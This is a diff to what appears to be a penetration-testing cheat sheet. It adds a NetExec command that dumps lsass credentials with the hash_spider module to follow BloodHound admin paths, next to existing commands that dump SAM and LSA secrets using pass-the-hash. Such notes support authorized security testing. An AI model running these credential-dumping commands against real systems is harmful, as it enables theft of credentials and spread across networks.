@@ -483,10 +483,16 @@ grep -i <keyword> *
   sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth --sam
   ```
   
-   ### Dump LSA on local computer
+  ### Dump LSA on local computer
   ```bash
   sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth --lsa
   ```
+
+  ### Dump lsass with hash_spider to recursively using BloodHound to find local admins path (adminTo)
+  ```bash
+  sudo NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth -M hash_spider
+  ```
+  
 </details> 
 
 <details>
